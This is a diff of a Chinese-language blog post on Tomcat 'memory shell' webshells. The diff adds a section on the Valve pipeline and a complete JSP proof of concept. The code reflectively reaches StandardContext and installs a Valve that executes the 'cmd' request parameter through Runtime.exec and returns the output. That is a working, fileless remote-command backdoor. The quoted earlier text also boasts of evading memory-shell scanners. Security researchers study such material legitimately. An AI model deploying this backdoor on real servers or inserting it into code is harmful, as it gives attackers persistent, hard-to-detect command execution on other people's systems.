@@ -8,7 +8,7 @@ categories:
 tags:
 - Java
 - Serialization
-date: 2025-01-13 14:13:17
+date: 2025-02-09 15:51:14
 ---
 
 # Java Tomcat 内存马
@@ -37,9 +37,9 @@ date: 2025-01-13 14:13:17
     ![d4503662-e491-4d2a-a9a4-02855ffbae91](Memory-Trojan-Servlet/d4503662-e491-4d2a-a9a4-02855ffbae91.png)
     Server 对应的就是一个 Tomcat 实例。Service 默认只有一个，也就是一个 Tomcat 实例默认一个 Service。
 
-2. 内存马主要的作用域在 Engine 内，因此主要来看 Engine。
+2. 内存马主要的作用域在 Engine 内，因此主要来看 Engine。一个 Container 可能对应如下对象（Container 和下面的概念同级，其本质就是一个可以接收 request 并返回对应 response 的对象）：
 
-    1. Engine/Container：引擎，用来管理多个站点，一个 Service 最多只能有一个 Engine；
+    1. Engine：引擎，用来管理多个站点，一个 Service 最多只能有一个 Engine；
     2. Host：代表一个站点，也可以叫虚拟主机，通过配置 Host 就可以添加站点；
     3. Wrapper：每一 Wrapper 封装着一个 Servlet；
     4. Context：代表一个应用程序，对应着平时开发的一套程序，或者一个 WEB-INF 目录以及下面的 web.xml 文件；
@@ -779,3 +779,103 @@ date: 2025-01-13 14:13:17
     > - 在 requestDestroyed 中再起一个新线程 sleep 一定时间后将我们添加的 Filter 卸载掉。
     >
     > 这样我们就有了一个真正的动态后门，只有用的时候才回去注册它，用完就删。平常使用扫内存马的软件也根本扫不出来。这个例子也是我突然拍脑袋想出来的，可能实际意义并不大，但是可以看出 Listener 内存马的危害性和玩法的变化要大于 Filter/Servlet 内存马的。
+
+## 5. Valve 内存马
+
+1. 在上文的 [1.2](# 1.2 Container 的请求处理) 中介绍了 Tomcat 的 Pipeline-Valve 责任链模式，之前所谈的 Filter 是最后 `StandardWrapperValve` 中的 Filter，既然 Filter 有内存马，那么再向上看一层，也就是 Valve，也是存在内存马的。
+
+### 5.1 管道 `Pipeline` 和阀门 `Valve`
+
+1. 先来看看管道 `Pipeline` 和阀门 `Valve` 的定义：
+    ![image-20250209144812825](Memory-Trojan-Servlet/image-20250209144812825.png)
+
+    `Pipeline` 说明了基本每个 `Pipeline` 对应一个 `Container`，每个 `Pipeline` 的 Basic 负责做最后的处理。该接口提供了 `setBasic()` 和 `addValve()`，我们主要关注 `addValve()`。官方指出，在添加 `Valve` 之前，需要设置所添加 `Valve` 的 `Container`。
+    ![image-20250209150703769](Memory-Trojan-Servlet/image-20250209150703769.png)
+    对 `Valve` 的介绍很简单，注意其业务执行逻辑在 `invoke()` 中：
+    ![image-20250209150823256](Memory-Trojan-Servlet/image-20250209150823256.png)
+
+2. 从 `Pipeline` 的继承入手，发现其只有一个继承类 `StandardPipeline`，其中该类定义了 `addValve()` 的逻辑：
+    ![image-20250209153928893](Memory-Trojan-Servlet/image-20250209153928893.png)
+    到这里可能会想，“我如何才能拿到运行中的 `StandardPipeline` 并调用其 `addValve()` 呢？”。从已知的 Tomcat 架构知识来看，`StandardPipeline` 并不是一个全局的对象，因此考虑向上寻找该方法的调用处，来到 `ContainerBase#addValve()`：
+    ![image-20250209154152525](Memory-Trojan-Servlet/image-20250209154152525.png)
+    再观察一下：
+    ![image-20250209154214952](Memory-Trojan-Servlet/image-20250209154214952.png)
+    这下从代码上明白 `Container` 和 `Pipeline` 是如何对应的了（注意 `ContainerBase` 实现了 `Container` 接口），所以现在着手的点在于 `ContainerBase`：
+    ![image-20250209154355436](Memory-Trojan-Servlet/image-20250209154355436.png)
+    这四个标准的容器都继承了 `ContainerBase`，`StandardContext` 是较为容易获取的，因此思路就打开了。
+
+### 5.2 PoC 编写
+
+1. 思路总结：
+
+    1. 获取到四大容器之一，以 `StandardContext` 为例。
+    2. 自定义 `Valve`，官方有 `ValveBase` 可供使用。
+    3. 调用 `StandardContext.addValve()`。
+
+2. PoC：
+    ```jsp
+    <%@ page import="java.io.IOException" %>
+    <%@ page import="java.lang.reflect.Field" %>
+    <%@ page import="org.apache.catalina.core.ApplicationContext" %>
+    <%@ page import="org.apache.catalina.core.StandardContext" %>
+    <%@ page import="org.apache.catalina.valves.ValveBase" %>
+    <%@ page import="org.apache.catalina.connector.Request" %>
+    <%@ page import="org.apache.catalina.connector.Response" %>
+    <%@ page import="java.io.InputStreamReader" %>
+    <%@ page import="java.io.BufferedReader" %>
+    <%@ page import="java.io.InputStream" %>
+    <%--
+      Created by IntelliJ IDEA.
+      User: hasee
+      Date: 2023/5/5
+      Time: 9:58
+      To change this template use File | Settings | File Templates.
+    --%>
+    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
+    <html>
+    <head>
+        <title>Title</title>
+    </head>
+    <body>
+    <%!
+        public class MemoryTrojanValve extends ValveBase {
+            @Override
+            public void invoke(Request request, Response response) throws IOException, ServletException {
+                InputStream inputStream = Runtime.getRuntime().exec(request.getParameter("cmd").trim()).getInputStream();
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "GB2312"));
+                String line;
+                StringBuilder result = new StringBuilder();
+                while ((line = bufferedReader.readLine()) != null) {
+                    result.append(line).append("\n");
+                }
+                bufferedReader.close();
+                inputStream.close();
+                System.out.println(result);
+                response.setCharacterEncoding("GB2312");
+                response.getWriter().write(result.toString().replaceAll("\n", "<\\br>"));
+                response.getWriter().flush();
+                response.getWriter().close();
+            }
+        }
+    %>
+    <%
+        // 1. 获取 StandardContext
+        ServletContext servletContext = request.getServletContext();
+        // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
+        Field applicationContextField = servletContext.getClass().getDeclaredField("context");
+        applicationContextField.setAccessible(true);
+        // 通过反射拿到 servletContext 具体的 ApplicationContext
+        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
+        // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
+        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+        standardContextField.setAccessible(true);
+        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+    
+        // 2. 获取到 StandardContext（Container），然后添加阀门
+        standardContext.addValve(new MemoryTrojanValve());
+    %>
+    </body>
+    </html>
+    ```
+
+    
